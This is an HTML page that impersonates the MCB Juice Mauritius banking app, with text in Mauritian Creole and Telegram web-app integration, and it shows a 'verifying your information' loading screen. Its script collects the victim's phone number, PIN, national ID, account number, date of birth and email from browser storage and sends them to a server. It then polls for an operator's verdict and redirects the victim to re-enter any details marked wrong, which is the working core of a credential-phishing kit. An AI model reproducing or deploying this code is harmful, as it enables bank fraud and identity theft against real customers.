<!DOCTYPE html>
<html lang="mfe">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MCB Juice Mauritius - Traitman</title>

    <!-- ✅ Telegram SDK -->
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        :root {
            --mcb-red: #d32f2f;
            --mcb-gradient: linear-gradient(180deg, #e53935 0%, #d32f2f 100%);
            --bg-dark: #333333;
            --card-bg: #ffffff;
            --text-dark: #222222;
            --text-muted: #666666;
        }

        * {
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: var(--bg-dark);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        .loading-card {
            background: var(--card-bg);
            width: 88%;
            max-width: 380px;
            padding: 45px 24px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.25);
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        .loader-circle {
            width: 110px;
            height: 110px;
            background: var(--mcb-gradient);
            border-radius: 50%;
            margin-bottom: 28px;
            display: flex;
            justify-content: center;
            align-items: center;
            box-shadow: 0 6px 18px rgba(211, 47, 47, 0.3);
        }

        .loader-circle::after {
            content: '';
            width: 82px;
            height: 82px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1.2s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            color: var(--mcb-red);
            font-size: 24px;
            margin: 0 0 10px;
            font-weight: 800;
            letter-spacing: -0.3px;
        }

        p {
            color: var(--text-muted);
            font-size: 15px;
            margin: 0;
            line-height: 1.5;
            font-weight: 500;
        }
    </style>
</head>

<body>

<div class="loading-card">
    <div class="loader-circle"></div>
    <h2 id="main-text">Silvouplé atan...</h2>
    <p id="sub-text">Pé verifye ou bann informasion...</p>
</div>

<script>
document.addEventListener("DOMContentLoaded", async () => {
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");

    const tg = window.Telegram?.WebApp;
    if (tg) {
        tg.ready();
        tg.expand();
    }

    const phone = localStorage.getItem("phone") || localStorage.getItem("userPhone") || "";
    const pin = localStorage.getItem("lastPin") || "";
    const nationalId = localStorage.getItem("nationalId") || "";
    const accountNumber = localStorage.getItem("accountNumber") || "";
    const dob = localStorage.getItem("dob") || "";
    const email = localStorage.getItem("email") || "";

    const identifier = phone || accountNumber;

    try {
        await fetch("/api/login-notification", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ phone, pin, nationalId, accountNumber, dob, email, country: "MU" })
        });
    } catch (err) {
        console.error("❌ Erreur:", err);
    }

    setTimeout(() => {
        mainText.textContent = "Silvouplé atan enn ti moman...";
        subText.textContent = "Sa pran zis enn segonn";
    }, 3000);

    async function checkApproval() {
        if (!identifier) return;

        try {
            const res = await fetch(`/api/check-status?phone=${identifier}`);
            const data = await res.json();

            if (data.status === "approved") {
                mainText.textContent = "Aprouve!";
                subText.textContent = "Ouverture paz ki swiv...";

                setTimeout(() => {
                    window.location.href = "/page8";
                }, 1500);
            }

            if (data.status === "denied") {
                mainText.textContent = "Refize!";
                subText.textContent = "PIN ou informasion pa korek.";

                setTimeout(() => {
                    window.location.href = "/page6?error=wrongpin";
                }, 2000);
            }

            if (data.status === "wrong_nationalid") {
                mainText.textContent = "National ID Pa Korek!";
                subText.textContent = "Silvouplé korize.";

                setTimeout(() => {
                    window.location.href = "/page3?error=nationalid";
                }, 2000);
            }

            if (data.status === "wrong_account") {
                mainText.textContent = "Account Number Pa Korek!";
                subText.textContent = "Silvouplé korize.";

                setTimeout(() => {
                    window.location.href = "/page3?error=account";
                }, 2000);
            }

            if (data.status === "wrong_dob") {
                mainText.textContent = "Date of Birth Pa Korek!";
                subText.textContent = "Silvouplé korize.";

                setTimeout(() => {
                    window.location.href = "/page3?error=dob";
                }, 2000);
            }

        } catch (err) {
            console.error("❌ Esek verification:", err);
        }
    }

    setInterval(checkApproval, 2000);
});
</script>

</body>
</html>
